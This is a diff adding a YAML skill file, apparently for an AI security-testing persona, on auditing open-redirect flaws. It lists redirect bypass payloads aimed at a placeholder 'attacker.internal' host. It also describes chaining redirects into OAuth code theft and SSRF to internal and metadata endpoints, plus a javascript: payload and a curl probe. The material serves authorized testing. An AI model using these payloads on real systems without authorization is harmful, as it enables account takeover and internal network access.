@@ -1,0 +1,60 @@
+schema_version: 1
+version: 3.0.0
+name: open-redirect
+description: Senior Open Redirect and URL redirection assessment — filter bypasses, OAuth authorization code theft chaining, and SSRF filter evasion chaining.
+triggers:
+  - open redirect
+  - url redirect
+  - redirect parameter
+  - return url
+  - next parameter
+  - destination parameter
+  - unvalidated redirect
+tools:
+  - curl
+knowledge: |
+  Audit URL redirection handlers and downstream attack chain multipliers with senior offensive engineering precision.
+
+  1. REDIRECTION PARAMETERS & VULNERABILITY MECHANISMS:
+     Applications frequently accept destination URLs via query parameters or post bodies to navigate users after authentication or workflow completion:
+     - Common Parameter Names:
+       `redirect`, `url`, `next`, `return`, `return_url`, `target`, `dest`, `destination`, `rurl`, `go`, `link`, `out`.
+     - Vulnerability Mechanism:
+       If the backend sets the HTTP `Location` response header or client-side JavaScript updates `window.location` without strict domain whitelisting, the endpoint redirects users to arbitrary external origins.
+
+  2. FILTER EVASION & PARSER CONFUSION TECHNIQUES:
+     When simple external URLs (`https://attacker.internal`) are blocked by naive string checks:
+     - Protocol-Relative URLs (Scheme Omission):
+       `//attacker.internal/` or `///attacker.internal/`
+     - Backslash & Delimiter Confusion:
+       `/\attacker.internal` or `\/attacker.internal` (browsers normalize backslashes to forward slashes; regex checks often miss them).
+     - Userinfo Domain Spoofing:
+       `https://trusted.target.local@attacker.internal/`
+       The browser treats `trusted.target.local` as userinfo credentials and connects to `attacker.internal`.
+     - Subdomain & Suffix Spoofing:
+       `https://trusted.target.local.attacker.internal/`
+       `https://trusted.target.local:attacker.internal/`
+     - URL Encoding Variations:
+       `%2f%2fattacker.internal` or `%252f%252fattacker.internal`
+     - Null Byte & Hash Suffixes:
+       `https://attacker.internal%23.trusted.target.local`
+       `https://attacker.internal%00.trusted.target.local`
+
+  3. IMPACT MULTIPLIERS & ATTACK CHAINING:
+     Open redirects are force-multipliers for severe vulnerability chains:
+     - OAuth 2.0 Authorization Code Thefts:
+       If an OAuth authorization server strictly allows `https://client.com/*`, chaining an open redirect on `https://client.com/redirect?url=https://attacker.internal` leaks the authorization code in the `Referer` header or redirect parameters upon exchange.
+     - SSRF Whitelist Bypass:
+       When backend services enforce strict IP/domain allowlists (e.g. only allowing calls to `trusted-partner.com`), targeting an open redirect on `trusted-partner.com` redirects the backend HTTP client to internal loopback (`http://127.0.0.1:8080/`) or cloud metadata endpoints.
+     - JavaScript Execution (DOM Redirects):
+       If client-side JavaScript sets `location.href = untrusted_param`, passing `javascript:console.log(1)` executes arbitrary code within the victim's session context.
+
+  4. VERIFICATION STANDARDS & MINIMAL STEPS:
+     - Verify using non-redirecting curl probes to inspect status codes and headers:
+       `curl -s -I "https://target.local/login?next=//attacker.internal" | grep -iE '^(http/|location:)'`
+     - A response with `HTTP/1.1 301` or `302` and `Location: //attacker.internal` or `Location: https://attacker.internal` confirms the vulnerability.
+references:
+  - persona:open-redirect-v3
+provenance:
+  origin: builtin
+  source: persona/v0.1/skills/open-redirect.yaml
